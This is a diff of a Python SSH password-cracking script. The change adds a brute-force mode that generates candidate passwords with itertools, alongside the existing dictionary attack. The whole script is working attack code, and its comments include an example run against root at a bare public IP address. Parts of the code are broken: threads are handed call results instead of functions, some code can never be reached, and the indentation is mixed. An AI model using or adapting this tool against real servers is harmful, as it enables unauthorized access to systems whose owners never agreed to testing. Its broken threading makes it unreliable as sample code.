@@ -1,14 +1,42 @@
 #!/usr/bin/env python
 
-import paramiko, sys, time, threading 
+import sys, time, threading
+import paramiko
+import itertools
+import socket
 
 ############################################
-# This script is meant to explicitly crack an SSH server given a dictionary file of passwords.
-# It could easily be manipulated to run through a brute-force list using itertools.
+# This script is meant to explicitly crack an SSH server.
+# It will run either a dictionary attack or a brute-force attack depending on whether a dictionary file is given.
 # To issue a test run, you may attempt to pentest one of the wargames servers over at overthewire.org
 # So long as ssh.py has correct permissions to run, simply type:
 # ./ssh.py manpage0 manpage0.labs.overthewire.org dictionary
+# Or for a brute-force attack, try:
+# ./ssh.py root 104.236.126.87
 ############################################
+# To fix: Add MOAR THREADING.  Fix the weird error that pops up at the beginning of a brute-force attack.
+
+passed_list = []
+
+def brute_gen():
+
+        list = 'abcdefghijklmnopqrstuvwxyz'
+        list1 = 'abcdefghijklmnopqrstuvwxyz1234567890'
+        LIST = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'
+        result = []
+        number = 8     #input("What is the maximum passwords length? ")
+        if type(number) != int:
+                print "Please enter a number."
+                main()
+        else:
+                for zz in range(5,9):
+                        for zzz in itertools.product(list1,repeat=zz):
+                                passed_list.append((''.join(zzz)))
+				if len(passed_list)%100 == 0:
+					return passed_list
+					time.sleep(20)
+					continue
+	
 
 def attempt(IP,UserName,Password):
 
@@ -22,48 +50,53 @@ def attempt(IP,UserName,Password):
 	except paramiko.AuthenticationException, error:
 		print '[-] Password failed: %s' % (Password)
 	
-	except socket.error, error:
-		print '[-] Socket Error.'
-
 	except paramiko.SSHException, error:
 		print '[-] Attempt failed, probably a missing host key.'
+
+	except socket.error, error:
+		print '[-] Socket error!'
 
 	except Exception, error:
 		print '[-] Unknown error!'
 
 	else:
-		print '\n[!] Found the correct credentials!\nUsername: %s\nPassword: %s\n' % (UserName, Password)
+ 		print '\n[!] Found the correct credentials!\nUsername: %s\nPassword: %s\n' % (UserName, Password)
 		ssh.close()
 		sys.exit(1)
 
 	ssh.close()
-
 	return
 
 def main():
 
-	if len(sys.argv) < 4:
-		print "\nUsage: %s Username Hostname /path/to/dictionary" % (str(sys.argv[0]))
-		print "\nExample: %s root 10.0.0.1 ~/dict.txt" % (str(sys.argv[0]))
-		sys.exit(1)
-
 	user = sys.argv[1]
 	ip = sys.argv[2]
-	filename = sys.argv[3]
 
-	try:
+	if len(sys.argv) == 3:
+		t1 = threading.Thread(target = brute_gen())
+		t1.start()
+		time.sleep(1)
+		print '[+] Running brute-force attack against %s@%s' % (user, ip)
+		for i in passed_list:
+			t2 = threading.Thread(target=attempt(ip, user, i))
+
+	elif len(sys.argv) == 4:
+		filename = sys.argv[3]
 		dictionary = open(filename, 'r')
+		print '[+] Running attack against %s@%s with dictionary: %s' % (user, ip, filename)
+		for i in dictionary.readlines():
+			t2 = threading.Thread(target=attempt(ip, user, i.strip()))
 
-	except IOError, error:
-		print "[-] Unable to open " + filename
+	else:
+		print "\nUsage: %s Username Hostname /path/to/dictionary" % (str(sys.argv[0]))
+                print "\nIf no dictionary file is given, a brute-force attack will be run."
+                print "\nExample: %s root 10.0.0.1 ~/dict.txt\n" % (str(sys.argv[0]))
+                sys.exit(1)
 
-	print '\n[+] Bruteforcing against %s@%s with dictionary %s' % (user, ip, filename)
-
-	for i in dictionary.readlines():
-		t = threading.Thread(target=attempt(ip, user, i.strip()))
-		t.start()
-		time.sleep(0.5) # This doesn't make as much of a difference as I thought it would.
-				# The bottleneck is probably the response time of the target.
+		t2.start()
+		t1.join()
+		t2.join()
+		time.sleep(0.5) # started with 0.3, but most servers couldn't handle that speed
     
 	dictionary.close()
 	sys.exit(0)
